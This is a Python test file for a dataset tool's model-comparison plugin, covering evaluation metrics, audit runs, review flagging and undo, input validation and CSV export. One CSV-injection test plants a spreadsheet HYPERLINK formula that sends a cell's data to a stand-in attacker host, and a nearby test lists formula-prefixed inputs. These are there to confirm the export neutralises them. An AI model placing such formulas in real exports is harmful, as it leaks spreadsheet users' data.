    c.post(f"{API}/evals/{eid}/flag", json={"dataset_id": ds, "image_ids": [iid], "conf": 0.5})          # F in the viewer
    first = db.query_one("SELECT note FROM reviews WHERE dataset_id=? AND rel_path='val/b.jpg'", (ds,))["note"]
    db.execute("UPDATE reviews SET note=? WHERE dataset_id=? AND rel_path='val/b.jpg'", ("looked at it\n" + first, ds))
    bulk = c.post(f"{API}/evals/{eid}/flag", json={"dataset_id": ds, "conf": 0.1, "criteria": {"fn": True, "fp": True}}).json()
    assert bulk["updated"] == 1 and bulk["flagged"] == 2                                              # c and d are new
    out = c.post(f"{API}/evals/{eid}/unflag", json={"dataset_id": ds, "op": bulk["op"]}).json()
    assert out["restored"] == 3
    row = db.query_one("SELECT status, note FROM reviews WHERE dataset_id=? AND rel_path='val/b.jpg'", (ds,))
    assert row["status"] == "flagged" and row["note"] == "looked at it\n" + first                     # the viewer flag stays
    assert db.query_one("SELECT 1 FROM reviews WHERE dataset_id=? AND rel_path='val/c.jpg'", (ds,)) is None
    out = c.post(f"{API}/evals/{eid}/unflag", json={"dataset_id": ds, "all": True}).json()
    row = db.query_one("SELECT status, note FROM reviews WHERE dataset_id=? AND rel_path='val/b.jpg'", (ds,))
    # back to unreviewed (status NULL), as before the first flag; the line a person wrote since is kept
    assert out["restored"] == 1 and row["status"] is None and row["note"] == "looked at it"


# ------------------------------------------------------------------ class view, audit runs, run coverage (wave 2a)

def test_class_view_merges_restricts_and_parses():
    from fovea.plugins.compare.evaluate import ClassView, parse_merge
    cv = ClassView([[1, 0], [1, 2]], only=[0, 2], labels={0: "person"})
    assert cv.rep == {0: 0, 1: 0, 2: 0} and cv.groups == {0: [0, 1, 2]}          # overlapping groups join
    assert cv.rows([[2, .5, .5, .1, .1], [5, .5, .5, .1, .1]]) == [[0, .5, .5, .1, .1]]   # 5 is out of scope
    meta = cv.to_meta(["a", "b", "c"])
    assert meta == {"merge": [[0, 1, 2]], "only": [0], "labels": {"0": "person (0+1+2)"}}
    back = ClassView.from_meta({"classes_view": meta})
    assert back.cls(1) == 0 and back.cls(3) is None
    assert not ClassView().active and ClassView().rows([[3, 0, 0, 1, 1]]) == [[3, 0, 0, 1, 1]]
    assert ClassView([[3, 4]]).to_meta(["x"])["labels"] == {"3": "class_3 + class_4"}
    assert parse_merge("0+1, 2 + 3") == [[0, 1], [2, 3]] and parse_merge([[1, 0]]) == [[0, 1]] and parse_merge("") == []
    for bad in ("0", "0+x", "-1+2"):
        with pytest.raises(ValueError):
            parse_merge(bad)


def _ids(ds):
    return {r["rel_path"]: r["id"] for r in db.query("SELECT id, rel_path FROM images WHERE dataset_id=?", (ds,))}


def _audit_run(ds, params, images, now=None, status="done"):
    now = now or db.now()
    return db.execute("INSERT INTO ai_runs(dataset_id, kind, provider, model, params, status, images, boxes, result, created_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
                      (ds, "audit", "yolo", "yolo12m", json.dumps(params), status, images, 0, json.dumps({"images_done": images}), now)).lastrowid


def test_api_geometry_audit_is_evaluated_at_the_family_level(world):
    from fovea.plugins.compare.evaluate import PSEUDO_BASE
    c = _client()
    ds = world["ds"]
    ids = _ids(ds)
    now = db.now()
    # a car box (class 2) on c: a person detector says nothing about it -> left out, not a miss
    db.execute("INSERT INTO boxes(image_id, dataset_id, cls, xc, yc, w, h) VALUES(?,?,?,?,?,?,?)", (ids["val/c.jpg"], ds, 2, .2, .2, .1, .1))
    db.execute("UPDATE datasets SET classes=? WHERE id=?", (db.dumps(["standing", "fallen", "car"]), ds))
    params = {"members": [{"provider": "yolo", "model": "yolo12m", "options": {}}], "conf_floor": 0.05, "hi": 0.5,
              "class_family": {"person": [0, 1]}, "fam_default": {"person": 0}, "mode": "geometry", "images": 4}
    rid = _audit_run(ds, params, 4, now)
    val = [ids[f"val/{s}.jpg"] for s in "abcd"]
    db.executemany("INSERT INTO ai_audit(image_id, dataset_id, run_id, score, counts, created_at) VALUES(?,?,?,?,?,?)",
                   [(i, ds, rid, 0.1, "{}", now) for i in val])
    P = PSEUDO_BASE
    rows = [(ids["val/a.jpg"], P, .3, .3, .2, .2, .9, "person"), (ids["val/a.jpg"], P, .7, .7, .2, .2, .8, "person"),
            (ids["val/b.jpg"], 1, .5, .5, .3, .3, .7, "person"),          # how ai-core stores it: fam_default + family label
            (ids["val/d.jpg"], 0, .5, .5, .1, .1, .3, "")]          # an already-mapped id works too (fam_default)
    db.executemany("INSERT INTO ai_preds(run_id,dataset_id,image_id,cls,xc,yc,w,h,conf,label,kind,state,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)",
                   [(rid, ds, i, cl, x, y, w, h, cf, lb, "detect", "info", now) for i, cl, x, y, w, h, cf, lb in rows])
    db.execute("INSERT INTO ai_preds(run_id,dataset_id,image_id,cls,xc,yc,w,h,conf,kind,ref_row,state,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)",
               (rid, ds, ids["val/c.jpg"], 1, .5, .5, .2, .4, None, "spurious", 0, "pending", now))     # a finding, not a prediction
    # an older audit that kept only its findings is listed, but not evaluable, with the reason
    old = _audit_run(ds, {"mode": "full", "members": [{"provider": "mock", "model": "m"}]}, 1, now - 100)
    runs = {r["id"]: r for r in c.get(f"{API}/runs", params={"dataset_id": ds}).json()["runs"]}
    assert runs[rid]["evaluable"] and runs[rid]["processed_known"] and runs[rid]["processed"] == 4 and runs[rid]["preds"] == 4
    assert runs[rid]["audit"]["mode"] == "geometry" and "“person” = 0 · standing, 1 · fallen" == runs[rid]["family_text"]
    assert not runs[old]["evaluable"] and "Run the audit again" in runs[old]["reason"]
    r = c.post(f"{API}/evaluate", json={"dataset_id": ds, "a": {"type": "run", "run_id": old}})
    assert r.status_code == 400 and "Run the audit again" in r.json()["detail"]
    chk = c.post(f"{API}/check", json={"dataset_id": ds, "source": {"type": "run", "run_id": rid}, "split": "val"}).json()["coverage"]
    assert chk["matched"] == 4 and chk["audit"]["family"] == {"person": [0, 1]} and chk["min_conf"] == 0.3
    eid, res = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": rid}, "split": "val", "conf": 0.25})
    a = res["summary"]["a"]
    # family GT: a 2, b 1, c 1 (the car is out). At 0.25: a 2 TP, b 1 TP (class 0 vs pseudo person), d 1 FP; c missed
    assert res["images"] == 4 and (a["gt"], a["tp"], a["fp"], a["fn"]) == (4, 3, 1, 1)
    ev = c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()
    assert ev["eval"]["classes_view"] == {"merge": [[0, 1]], "only": [0], "labels": {"0": "person (0+1)"}}
    assert any("geometry mode" in w["text"] for w in ev["eval"]["warnings"])
    assert list(ev["curves"]["a"]["classes"]) == ["0"]
    cm = c.get(f"{API}/evals/{eid}/confusion", params={"dataset_id": ds, "conf": 0.25}).json()
    assert cm["labels"] == [0] and cm["matrix"][0][0] == 3 and cm["matrix"][1][0] == 1 and cm["matrix"][0][1] == 1
    det = c.get(f"{API}/evals/{eid}/image/{ids['val/c.jpg']}", params={"dataset_id": ds, "conf": 0.25}).json()["detail"]
    assert det["gt"] == [[0, .5, .5, .2, .4]] and det["gt_out"] == [[2, .2, .2, .1, .1]] and det["sides"]["a"]["counts"]["fn"] == 1
    assert not det["sides"]["a"]["changed"]
    det = c.get(f"{API}/evals/{eid}/image/{ids['val/a.jpg']}", params={"dataset_id": ds, "conf": 0.25}).json()["detail"]
    assert [p["box"][0] for p in det["sides"]["a"]["preds"]] == [0, 0] and det["sides"]["a"]["counts"]["tp"] == 2
    classes_csv = c.get(f"{API}/evals/{eid}/export", params={"dataset_id": ds, "what": "classes"}).text
    assert "person (0+1)" in classes_csv
    lst = c.get(f"{API}/evals", params={"dataset_id": ds}).json()["evals"]
    assert lst[0]["classes_view"]["only"] == [0]
    # B = a folder of per-class predictions in the same evaluation is judged on the same family view
    eid2, res2 = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": rid}, "b": {"type": "folder", "path": str(world["a"])},
                          "split": "val", "conf": 0.25})
    b = res2["summary"]["b"]
    assert b["gt"] == 4 and (b["tp"], b["fp"], b["fn"]) == (4, 1, 0)          # b's 0->1 swap is a family hit


def test_api_audit_warnings_committee_and_applied_fixes(world):
    c = _client()
    ds = world["ds"]
    ids = _ids(ds)
    now = db.now()
    params = {"members": [{"provider": "yolo", "model": "yolo12m"}, {"provider": "yoloe", "model": "yoloe-26s-seg"}],
              "mode": "full", "conf_floor": 0.05, "images": 2}
    rid = _audit_run(ds, params, 2, now)
    db.executemany("INSERT INTO ai_preds(run_id,dataset_id,image_id,cls,xc,yc,w,h,conf,kind,state,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)",
                   [(rid, ds, ids["val/a.jpg"], 0, .3, .3, .2, .2, .9, "detect", "info", now),
                    (rid, ds, ids["val/b.jpg"], 0, .5, .5, .3, .3, .8, "detect", "info", now),
                    (rid, ds, ids["val/b.jpg"], 0, .5, .5, .3, .3, None, "missing", "accepted", now)])
    eid, res = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": rid}, "split": "val"})
    assert res["images"] == 2                     # every image the audit left a row for = its image count: exact
    texts = " ".join(w["text"] for w in c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]["warnings"])
    assert "asked 2 models" in texts and "main model only (yolo · yolo12m)" in texts and "1 finding of this audit was applied" in texts
    assert c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]["sources"]["a"]["label"] == f"Audit #{rid} · yolo · yolo12m"
    assert "geometry" not in texts and "does not record" not in texts
    assert c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]["classes_view"] is None


def test_api_user_merge_counts_classes_as_one(world):
    c = _client()
    ds = world["ds"]
    base = {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "split": "val", "conf": 0.25}
    assert c.post(f"{API}/evaluate", json={**base, "merge": "0"}).status_code == 400
    eid, res = _run(c, {**base, "merge": "0+1"})
    a = res["summary"]["a"]
    # per class: b's class-1 box on GT 0 was a swap; merged it is a hit. c's 0.3 box sits on nothing: still a FP
    assert (a["gt"], a["tp"], a["fp"], a["fn"]) == (4, 4, 1, 0)
    ev = c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]
    assert ev["classes_view"] == {"merge": [[0, 1]], "only": None, "labels": {"0": "person + fall"}}


def test_processed_images_fallback_and_replaced_proposals(world):
    from fovea.plugins.compare.evaluate import processed_images
    c = _client()
    ds = world["ds"]
    ids = _ids(ds)
    now = db.now()
    a, b, cc = ids["val/a.jpg"], ids["val/b.jpg"], ids["val/c.jpg"]
    ins = "INSERT INTO ai_preds(run_id,dataset_id,image_id,cls,xc,yc,w,h,conf,kind,state,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)"
    # no recorded ids, but every processed image has a row and the count adds up -> exact
    r1 = db.execute("INSERT INTO ai_runs(dataset_id, kind, provider, model, params, status, images, boxes, result, created_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
                    (ds, "batch", "mock", "m", json.dumps({"target": "proposals", "images": 3}), "done", 3, 3, "{}", now)).lastrowid
    db.executemany(ins, [(r1, ds, i, 0, .5, .5, .2, .2, .9, "detect", "pending", now) for i in (a, b, cc)])
    run = db.query_one("SELECT * FROM ai_runs WHERE id=?", (r1,))
    assert processed_images(run) == ({a, b, cc}, set())
    # a later proposal on b replaced r1's pending prediction: b is reported and left out, not scored as 'found nothing'
    db.execute("DELETE FROM ai_preds WHERE run_id=? AND image_id=?", (r1, b))
    db.execute("UPDATE ai_runs SET result=? WHERE id=?", (json.dumps({"image_ranges": [[min(a, b, cc), max(a, b, cc)]]}), r1))
    r2 = db.execute("INSERT INTO ai_runs(dataset_id, kind, provider, model, params, status, images, boxes, created_at) VALUES(?,?,?,?,?,?,?,?,?)",
                    (ds, "propose", "mock", "m", "{}", "done", 1, 1, now + 1)).lastrowid
    db.execute(ins, (r2, ds, b, 1, .5, .5, .2, .2, .7, "detect", "pending", now + 1))
    run = db.query_one("SELECT * FROM ai_runs WHERE id=?", (r1,))
    processed, replaced = processed_images(run)
    assert b in processed and replaced == {b}
    chk = c.post(f"{API}/check", json={"dataset_id": ds, "source": {"type": "run", "run_id": r1}, "split": "val"}).json()["coverage"]
    assert chk["replaced"] == 1 and chk["matched"] == len(processed & set(ids.values())) - 1
    eid, res = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": r1}, "split": "val"})
    assert b not in {r["id"] for r in c.get(f"{API}/evals/{eid}/rows", params={"dataset_id": ds, "show": "all"}).json()["items"]}
    texts = " ".join(w["text"] for w in c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]["warnings"])
    assert "lost this run's proposals" in texts
    # a run stored from confidence 0.25 up gets a note that AP misses the low-confidence tail
    r3 = db.execute("INSERT INTO ai_runs(dataset_id, kind, provider, model, params, status, images, boxes, result, created_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
                    (ds, "benchmark", "yolo", "y", "{}", "done", 1, 1, json.dumps({"image_ids": [a]}), now)).lastrowid
    db.execute(ins, (r3, ds, a, 0, .3, .3, .2, .2, .4, "detect", "info", now))
    eid, _ = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": r3}, "split": "val"})
    texts = " ".join(w["text"] for w in c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]["warnings"])
    assert "only from confidence 0.40 up" in texts


def test_run_coverage_suggests_the_split_the_run_covers(world):
    c = _client()
    ds = world["ds"]
    ids = _ids(ds)
    now = db.now()
    a, b = ids["val/a.jpg"], ids["val/b.jpg"]
    rid = db.execute("INSERT INTO ai_runs(dataset_id, kind, provider, model, params, status, images, boxes, result, created_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
                     (ds, "benchmark", "yolo", "y", "{}", "done", 2, 2, json.dumps({"image_ids": [a, b]}), now)).lastrowid
    db.executemany("INSERT INTO ai_preds(run_id,dataset_id,image_id,cls,xc,yc,w,h,conf,kind,state,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)",
                   [(rid, ds, i, 0, .5, .5, .2, .2, .05, "detect", "info", now) for i in (a, b)])
    chk = c.post(f"{API}/check", json={"dataset_id": ds, "source": {"type": "run", "run_id": rid}, "split": ""}).json()["coverage"]
    assert chk["matched"] == 2 and chk["images"] == 5
    assert [(h["kind"], h["splits"]) for h in chk["hints"]] == [("split", ["val"])] and "evaluate it alone" in chk["hints"][0]["text"]
    eid, _ = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": rid}, "split": ""})
    texts = [w["text"] for w in c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]["warnings"]]
    assert any("3 images in scope were not evaluated: an AI run covers only the images it processed" in t for t in texts)


def test_api_run_a_model_uses_batched_inference_and_counts_bad_frames(world, monkeypatch):
    c = _client()
    ds = world["ds"]
    monkeypatch.setenv("FOVEA_AI_MOCK", "1")
    from fovea.ai import base, pipeline, registry
    monkeypatch.setattr(registry, "is_cloud", lambda pid: False)
    monkeypatch.setattr(pipeline, "batch_capable", lambda provider, options=None: True)
    ids = _ids(ds)
    bad = ids["val/c.jpg"]
    calls = []

    def fake_many(ds_row, imgs, provider, model, conf=None, cls_ids=None, options=None, exclude_exemplars=()):
        calls.append(len(imgs))
        return [base.ProviderError("decode failed", "bad_output") if r["id"] == bad else
                {"preds": [{"cls": 0, "xc": .5, "yc": .5, "w": .2, "h": .2, "conf": .9, "label": "", "kind": "detect", "reason": ""}],
                 "usage": base.Usage()} for r in imgs]
    monkeypatch.setattr(pipeline, "detect_images", fake_many)
    r = c.post(f"{API}/runs/start", json={"dataset_id": ds, "provider": "mock", "split": "val", "conf": 0.01})
    assert r.status_code == 200, r.text
    job_id, run_id = r.json()["job"]["id"], r.json()["run_id"]
    for _ in range(500):
        j = c.get(f"/api/jobs/{job_id}").json()["job"]
        if j["status"] in ("done", "error", "cancelled"):
            break
        time.sleep(0.02)
    assert j["status"] == "done", j
    assert calls == [4]                                            # the 4 val frames went through in one call
    res = json.loads(db.query_one("SELECT result FROM ai_runs WHERE id=?", (run_id,))["result"])
    covered = {i for a, b in res["image_ranges"] for i in range(a, b + 1)}
    assert res["errors"] == 1 and bad not in covered and len(covered) == 3 and "decode failed" in res["last_error"]


# ------------------------------------------------------------------ hardening (review round 1)

def _run_job(c, body):
    """Like _run, but returns the finished job itself (its last message is what Activity shows)."""
    r = c.post(f"{API}/evaluate", json=body)
    assert r.status_code == 200, r.text
    job_id = r.json()["job"]["id"]
    for _ in range(400):
        j = c.get(f"/api/jobs/{job_id}").json()["job"]
        if j["status"] in ("done", "error", "cancelled"):
            return j
        time.sleep(0.02)
    raise AssertionError("evaluation did not finish")


def test_api_non_string_dataset_id_and_odd_bodies_are_400_not_500(world):
    c = _client()
    ds = world["ds"]
    eid, _ = _run(c, {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "split": "val"})
    posts = ("evaluate", "check", "runs/start", f"evals/{eid}/flag", f"evals/{eid}/unflag")
    for bad in (["x"], {"x": 1}, 99999999999999999999999, 5, True, ""):
        for ep in posts:
            r = c.post(f"{API}/{ep}", json={"dataset_id": bad, "a": {"type": "run", "run_id": 1}})
            # (the app may refuse a number beyond int64 for every route before Compare sees it: 422)
            assert r.status_code == 400 or (r.status_code == 422 and isinstance(bad, int)), (ep, bad, r.status_code, r.text)
            assert "dataset_id" in str(r.json()["detail"])
    assert c.post(f"{API}/evaluate", json={"dataset_id": "no-such-ds", "a": str(world["a"])}).status_code == 404
    # the rest of a body: wrong JSON types are refused or ignored, never a crash
    huge = {"dataset_id": ds, "a": {"type": "run", "run_id": 99999999999999999999999}}
    assert c.post(f"{API}/evaluate", json=huge).status_code in (404, 422)
    assert c.post(f"{API}/check", json={**huge, "source": huge["a"]}).status_code in (404, 422)
    from fovea.plugins.compare import _source_spec
    with pytest.raises(Exception) as e:                    # and Compare's own check, whatever the app does first
        _source_spec(ds, {"type": "run", "run_id": 2 ** 70}, "a")
    assert getattr(e.value, "status_code", None) == 404
    flag = f"{API}/evals/{eid}/flag"
    assert c.post(flag, json={"dataset_id": ds, "criteria": ["fn"], "dry_run": True}).status_code == 400
    assert c.post(flag, json={"dataset_id": ds, "image_ids": 7, "dry_run": True}).status_code == 400
    assert c.post(flag, json={"dataset_id": ds, "image_ids": ["²", True, "x", -3, 1.5], "dry_run": True}).json()["images"] == 0
    from fovea.plugins.compare import _id_list
    assert _id_list(["²", 2 ** 70, True, "x", -3, "7", 8], "ids") == [7, 8]
    assert c.post(flag, json={"dataset_id": ds, "table": {"side": ["a"], "show": "all"}, "dry_run": True}).json()["images"] == 4
    assert c.post(f"{API}/evals/{eid}/unflag", json={"dataset_id": ds, "image_ids": "12"}).status_code == 400
    for conf in ("nan", "inf", "-inf"):
        assert c.get(f"{API}/evals/{eid}/rows", params={"dataset_id": ds, "conf": conf, "show": "all"}).status_code == 200, conf
    assert c.get(f"{API}/evals/{eid}/confusion", params={"dataset_id": ds, "classes": "0,²"}).status_code == 200


def test_csv_safe_prefixes_formula_text_only():
    from fovea.plugins.compare import _csv_safe
    for s in ("=1+1", "+SUM(1,2)", "-2.jpg", "@cmd", "\tx", "\rx"):
        assert _csv_safe(s) == "'" + s
    for v in ("val/a.jpg", "person", "", "test-1854-1860-포함/a.jpg", 3, -1, None):
        assert _csv_safe(v) == v


def test_api_csv_export_does_not_carry_live_formulas(tmp_path):
    """Class names come from data.yaml and file names from disk: neither may reach a spreadsheet as a formula."""
    import csv as _csv
    import io as _io
    from fovea.core.scanner import scan_dataset
    from fovea.jobs import Job
    root, pred = tmp_path / "flat", tmp_path / "pred"
    for stem in ("=cmd", "-2", "ok"):
        _img(root / "images" / f"{stem}.jpg")
        _txt(root / "labels" / f"{stem}.txt", "0 0.5 0.5 0.2 0.2\n1 0.3 0.3 0.1 0.1\n")
        _txt(pred / f"{stem}.txt", "0 0.5 0.5 0.2 0.2 0.9\n")
    db.init_db()
    lay = layout.detect(str(root))
    ds = "cmp-x-" + uuid.uuid4().hex[:8]
    evil = ['=HYPERLINK("http://evil.example/?d="&C2,"open")', "+SUM(1,2)"]
    db.execute("INSERT INTO datasets(id,name,root,layout,classes,classes_source,description,status,created_at,updated_at)"
               " VALUES(?,?,?,?,?,?,?,?,?,?)", (ds, ds, lay.root, db.dumps(lay.to_dict()), db.dumps(evil), "user", "", "new", db.now(), db.now()))
    try:
        scan_dataset(ds, Job(id="s", kind="scan"))
        c = _client()
        eid, res = _run(c, {"dataset_id": ds, "a": {"type": "folder", "path": str(pred)}})
        assert res["saved"] and res["images"] == 3
        for what, col in (("classes", 1), ("images", 1)):
            text = c.get(f"{API}/evals/{eid}/export", params={"dataset_id": ds, "what": what, "show": "all"}).text.lstrip("﻿")
            rows = list(_csv.reader(_io.StringIO(text)))[1:]
            cells = [r[col] for r in rows]
            assert cells and not any(v[:1] in "=+-@\t\r" for v in cells if v), cells
        classes = list(_csv.reader(_io.StringIO(c.get(f"{API}/evals/{eid}/export", params={"dataset_id": ds, "what": "classes"}).text.lstrip("﻿"))))
        assert [r[1] for r in classes[1:]] == ["'" + n for n in evil]           # the name stays readable, as text
        images = c.get(f"{API}/evals/{eid}/export", params={"dataset_id": ds, "what": "images", "show": "all", "sort": "name"}).text
        assert "'=cmd.jpg" in images and "'-2.jpg" in images and ",ok.jpg," in images
    finally:
        for t in ("plugin_data WHERE plugin='compare' AND dataset_id", "boxes WHERE dataset_id", "images WHERE dataset_id", "datasets WHERE id"):
            db.execute(f"DELETE FROM {t}=?", (ds,))


def test_api_evaluation_job_ends_with_how_it_ended(world):
    c = _client()
    ds = world["ds"]
    j = _run_job(c, {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "split": "val"})
    assert j["status"] == "done" and j["result"]["saved"] and j["message"] == "Done · 4 images"
    j = _run_job(c, {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "split": "train"})
    assert j["status"] == "done" and not j["result"]["saved"]
    assert j["message"].startswith("Not saved · Model A: no prediction file matched"), j["message"]


def _css_vars(block: str) -> dict:
    import re
    return dict(re.findall(r"(--cmp-[ab]):\s*(#[0-9a-fA-F]{6})", block))


def _contrast(a: str, b: str) -> float:
    def lum(h):
        ch = [int(h[i:i + 2], 16) / 255 for i in (1, 3, 5)]
        ch = [v / 12.92 if v <= 0.03928 else ((v + 0.055) / 1.055) ** 2.4 for v in ch]
        return 0.2126 * ch[0] + 0.7152 * ch[1] + 0.0722 * ch[2]
    hi, lo = sorted((lum(a), lum(b)), reverse=True)
    return (hi + 0.05) / (lo + 0.05)


def test_source_tags_meet_text_contrast_in_both_themes():
    """The 11 px bold 'A'/'B' tags are text: 4.5:1 on their series colour, light and dark (and in the viewer)."""
    import re
    css = (Path(__file__).resolve().parents[1] / "fovea/plugins/compare/static/compare.css").read_text()
    light = _css_vars(css.split("[data-theme=\"dark\"] .cmp", 1)[0])
    dark = _css_vars(css.split("[data-theme=\"dark\"] .cmp", 1)[1].split("}", 1)[0])
    assert set(light) == set(dark) == {"--cmp-a", "--cmp-b"}

    def text_color(selector):
        m = re.search(re.escape(selector) + r"\s*\{([^}]*)\}", css)
        cm = re.search(r"(?<![-\w])color:\s*(#[0-9a-fA-F]{3,6})", m.group(1)) if m else None
        return cm.group(1) if cm else None

    base = text_color(".cmp-tag")
    for side in ("a", "b"):
        fg = text_color(f".cmp-tag.{side}") or base
        fg = "#" + "".join(ch * 2 for ch in fg[1:]) if len(fg) == 4 else fg
        for theme in (light, dark):
            assert _contrast(fg, theme[f"--cmp-{side}"]) >= 4.5, (side, fg, theme)
    # the viewer's panel tags sit on its fixed side colours
    js = (Path(__file__).resolve().parents[1] / "fovea/plugins/compare/static/viewer.js").read_text()
    sides = dict(re.findall(r"([ab]): '(#[0-9a-fA-F]{6})'", re.search(r"SIDE_COLORS = \{([^}]*)\}", js).group(1)))
    fg = text_color(".cmp-v-side")
    fg = "#" + "".join(ch * 2 for ch in fg[1:]) if len(fg) == 4 else fg
    assert set(sides) == {"a", "b"} and all(_contrast(fg, v) >= 4.5 for v in sides.values()), (fg, sides)


# ------------------------------------------------------------------ round 2 fixes

def _wait(c, job_id, what="job"):
    for _ in range(500):
        j = c.get(f"/api/jobs/{job_id}").json()["job"]
        if j["status"] in ("done", "error", "cancelled"):
            assert j["status"] == "done", j
            return j
        time.sleep(0.02)
    raise AssertionError(f"{what} did not finish")


def test_api_undo_puts_an_unreviewed_image_with_a_note_back_to_unreviewed(world):
    """An image with only a note (status NULL) that Compare flags is unreviewed again after the undo, note intact."""
    c = _client()
    ds = world["ds"]
    eid, _ = _run(c, {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "split": "val"})
    iid = _ids(ds)["val/b.jpg"]
    db.execute("INSERT INTO reviews(dataset_id, rel_path, status, note, updated_at) VALUES(?,?,?,?,?)",
               (ds, "val/b.jpg", None, "check the helmet later", db.now()))
    f = c.post(f"{API}/evals/{eid}/flag", json={"dataset_id": ds, "image_ids": [iid]}).json()
    row = db.query_one("SELECT status, note FROM reviews WHERE dataset_id=? AND rel_path='val/b.jpg'", (ds,))
    assert f["flagged"] == 1 and row["status"] == "flagged" and row["note"].startswith("check the helmet later\nCompare #")
    out = c.post(f"{API}/evals/{eid}/unflag", json={"dataset_id": ds, "op": f["op"]}).json()
    row = db.query_one("SELECT status, note FROM reviews WHERE dataset_id=? AND rel_path='val/b.jpg'", (ds,))
    assert out["restored"] == 1 and row["status"] is None and row["note"] == "check the helmet later"
    # it reads as unreviewed everywhere: no 'flagged' count, no review chip in Compare's table
    assert c.get(f"/api/datasets/{ds}/images", params={"review": "flagged"}).json()["total"] == 0
    items = c.get(f"{API}/evals/{eid}/rows", params={"dataset_id": ds, "show": "all"}).json()["items"]
    assert [it["review"] for it in items if it["id"] == iid] == [{"status": None, "note": "check the helmet later"}]
    assert c.get(f"{API}/evals/{eid}/image/{iid}", params={"dataset_id": ds}).json()["image"]["review"] is None


def test_api_run_coverage_counts_boxes_and_accepted_labels_in_scope_only(world):
    """The coverage line pairs the scoped image count with the scoped box count; 'accepted into the labels' counts
    only boxes the labels still hold: not an accept that found the box already there, not boxes deleted since. A History
    restore of the accept's snapshot takes the boxes out AND puts the proposals back to pending: nothing counts then."""
    c = _client()
    ds = world["ds"]
    ids = _ids(ds)
    a, b, cc, d = (ids[f"val/{s}.jpg"] for s in "abcd")
    e = ids["train/e.jpg"]
    now = db.now()
    rid = db.execute("INSERT INTO ai_runs(dataset_id, kind, provider, model, params, status, images, boxes, result, created_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
                     (ds, "batch", "yolo", "yolo12m", json.dumps({"target": "proposals"}), "done", 5, 5,
                      json.dumps({"image_ids": [a, b, cc, d, e]}), now)).lastrowid
    ins = "INSERT INTO ai_preds(run_id,dataset_id,image_id,cls,xc,yc,w,h,conf,kind,state,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)"
    db.executemany(ins, [(rid, ds, a, 0, .31, .3, .2, .2, .9, "detect", "pending", now),     # over a's class-0 box: a duplicate
                         (rid, ds, cc, 0, .2, .2, .1, .1, .7, "detect", "pending", now),     # fresh: written into c
                         (rid, ds, d, 0, .6, .6, .1, .1, .8, "detect", "pending", now),      # fresh: written into d
                         (rid, ds, e, 1, .8, .8, .1, .1, .6, "detect", "pending", now),      # fresh, but train: out of scope
                         (rid, ds, e, 0, .2, .8, .1, .1, .5, "detect", "pending", now)])
    chk = lambda: c.post(f"{API}/check", json={"dataset_id": ds, "source": {"type": "run", "run_id": rid}, "split": "val"}).json()["coverage"]
    run_row = lambda: next(x for x in c.get(f"{API}/runs", params={"dataset_id": ds}).json()["runs"] if x["id"] == rid)
    cov = chk()
    assert (cov["matched"], cov["images"], cov["preds"], cov["run_preds"], cov["accepted"]) == (4, 4, 3, 5, 0)
    assert cov["has_conf"]
    _e0, before = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": rid}, "split": "val"})
    # Explore's bulk accept: 4 boxes written, 1 already labeled (it stays 'accepted' but is marked as such)
    r = c.post(f"/api/datasets/{ds}/proposals/accept", json={"image_ids": [a, b, cc, d, e]})
    assert r.status_code == 200, r.text
    stats = _wait(c, r.json()["job"]["id"], "accept")["result"]
    assert stats["added"] == 4 and stats["duplicates"] == 1
    dup = db.query_one("SELECT state, reason FROM ai_preds WHERE run_id=? AND image_id=?", (rid, a))
    assert dup["state"] == "accepted" and dup["reason"] == "already labeled"
    assert chk()["accepted"] == 2                                              # c and d: in scope and in the labels
    whole = c.post(f"{API}/check", json={"dataset_id": ds, "source": {"type": "run", "run_id": rid}, "split": ""}).json()["coverage"]
    assert (whole["preds"], whole["accepted"]) == (5, 4)
    eid, _ = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": rid}, "split": "val"})
    texts = [w["text"] for w in c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]["warnings"]]
    assert any("2 of these predictions were accepted into the labels and are still there" in t for t in texts), texts
    assert run_row()["accepted"] == 5
    # History: restore the version saved right before the accept -> the boxes are gone, and so are the accept's
    # decisions (core.snapshots puts the proposals it decided back to pending, the duplicate's 'already labeled'
    # mark with them): Compare is exactly where it was before the accept, warning gone, same metrics
    sid = db.query_one("SELECT id FROM snapshots WHERE dataset_id=? ORDER BY id DESC LIMIT 1", (ds,))["id"]
    r = c.post(f"/api/datasets/{ds}/snapshots/{sid}/restore", json={})
    assert r.status_code == 200, r.text
    assert _wait(c, r.json()["job"]["id"], "restore")["result"]["proposals"] == {"pending": 5}
    rows = db.query("SELECT state, reason FROM ai_preds WHERE run_id=? ORDER BY id", (rid,))
    assert [(x["state"], x["reason"]) for x in rows] == [("pending", "")] * 5
